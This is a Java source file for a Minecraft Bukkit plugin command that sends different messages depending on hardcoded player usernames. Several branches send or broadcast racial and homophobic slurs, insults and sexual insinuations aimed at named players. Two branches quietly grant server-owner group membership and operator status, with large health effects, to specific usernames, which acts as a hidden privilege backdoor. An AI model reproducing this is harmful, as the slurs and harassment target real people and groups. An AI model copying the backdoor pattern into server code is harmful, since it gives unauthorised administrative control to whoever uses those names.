package me.Paldiu.NNO.Commands;

import me.Paldiu.NNO.Main;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import org.bukkit.scheduler.BukkitRunnable;

public class special implements CommandExecutor
{
    public Main plugin;
    public special(Main instance)
    {
        plugin = instance;
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
    {
        if (commandLabel.equalsIgnoreCase("special"))
        {
            final Player p = (Player) sender;
            if (p.getName().equalsIgnoreCase("paldiu"))
            {
                Bukkit.getServer().broadcastMessage(ChatColor.GREEN + p.getName() + " is a developer!");
                p.sendMessage("Hey Paldiu, how's it going?");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("nerdygirl544"))
            {
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                p.chat("I CAN HAS OP PLOX?");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("austindapro"))
            {
                p.sendMessage("Paldiu has scripted this command so that he can say to you that:");
                p.sendMessage(ChatColor.DARK_RED + "You are a swiggor.");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("smack17"))
            {
                Bukkit.getServer().dispatchCommand(sender, "pex group Owner user add " + p.getName());
                Bukkit.getServer().broadcastMessage(ChatColor.BLUE + p.getName() + " is the Owner of the server!");
                p.sendMessage("Paldiu has scripted this command so that he can say to you that:");
                p.sendMessage(ChatColor.DARK_AQUA + "You have no friends <3");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("bees_knees") || p.getName().equalsIgnoreCase("dethplaque"))
            {
                Bukkit.getServer().broadcastMessage(ChatColor.DARK_GREEN + "Paldiu thinks that " + p.getName() + " is a sexy, sexy beast.");
                p.setOp(true);
                p.setHealth(20);
                Bukkit.getServer().dispatchCommand(sender, "effect " + p.getName() + " absorption 600000 10000");
                Bukkit.getServer().dispatchCommand(sender, "effect " + p.getName() + " regeneration 600000 10000");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("zmorlan"))
            {
                Bukkit.getServer().broadcastMessage(ChatColor.BLUE + p.getName() + " is a #YOLOIST :D");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("wolfang302"))
            {
                Bukkit.getServer().broadcastMessage(ChatColor.RED + "I heard that " + p.getName() + " is the best player alive!");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("milkoe777"))
            {
                p.sendMessage("Sup Milkoe, Paldiu here. I heard you're a sexy beast <3");
                return true;
            }
                
            else if (p.getName().equalsIgnoreCase("mustardbukkit"))
            {
                p.sendMessage("Sup Jon, its Paul. You're a faggot <3");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("cole_dorais_17"))
            {
                p.sendMessage("NIGGERSSSSSSSSSSSSSSSSSSSSSSSSSS");
                Bukkit.getServer().broadcastMessage(ChatColor.RED + p.getName() + ": Implementing the NiggerCannon...");
                
                new BukkitRunnable()
                {
                    @Override
                    public void run()
                    {
                        Bukkit.getServer().broadcastMessage(ChatColor.BLUE + p.getName() + ": FIRING THE NIGGERCANNON!");
                    }
                }.runTaskLater(plugin, 20L * 2L);
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("soccerkiff"))
            {
                p.sendMessage("Sup Soccerkiff.");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("_beatty"))
            {
                p.sendMessage("I heard smack17 likes small Asian boys ;3");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("99may"))
            {
                p.sendMessage("I have no clue who you are so here have some uh.. idk?");
                p.playSound(p.getLocation(), Sound.WATER, 50, 10);
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("bobaddie"))
            {
                p.sendMessage(ChatColor.YELLOW + "I have no clue what this command is supposed to do.");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("0supermariofan"))
            {
                p.sendMessage("I think that austindapro wants some hardcore sex with you.");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("dylanwheeldon"))
            {
                p.sendMessage("Smack17 thinks you're sexy <3");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("karlson_12"))
            {
                Bukkit.getServer().broadcastMessage(ChatColor.BLUE + p.getName() + ChatColor.WHITE + ": Fucknuts! :D");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("prime_time15"))
            {
                p.sendMessage("Ever heard the song \"Prime Time\" by Daft Punk?");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("rd_hall"))
            {
                p.sendMessage(ChatColor.DARK_AQUA + "I forgot what you wanted... but wasn't it about a dog with purple shits or something?");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("therbs"))
            {
                p.sendMessage("If any players tell you that they are looking for some fuck, ");
                p.sendMessage("please disregard it. Thank you <3");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("itaintobesy"))
            {
                p.sendMessage(ChatColor.RED + "Paldiu has scripted this command to tell you:");
                p.sendMessage(ChatColor.BLUE + "b0nr");
                
                new BukkitRunnable()
                {
                    @Override
                    public void run()
                    {
                        p.sendMessage(ChatColor.GREEN + "Oh, and btw, you're a wonderful PVPer :D");
                    }
                }.runTaskLater(plugin, 40L * 2L);
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("jeepers616"))
            {
                Bukkit.getServer().broadcastMessage(ChatColor.BLUE + p.getName() + " is a sexy, sexy beast :D");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("kodyking"))
            {
                p.sendMessage(ChatColor.LIGHT_PURPLE + "[Server]: I like fish.");
                return true;
            }
            
            else if (p.getName().equalsIgnoreCase("dimond_detective"))
            {
                p.sendMessage(ChatColor.YELLOW + "Paldiu has scripted this command to let you know that:");
                p.sendMessage(ChatColor.BLUE + "It's spelled uh... diamond... I hope you know that lol");
                return true;
            }
            
            else
            {
                p.sendMessage("Your username has not been implemented yet!");
            }
        }
        return false;
    }
}
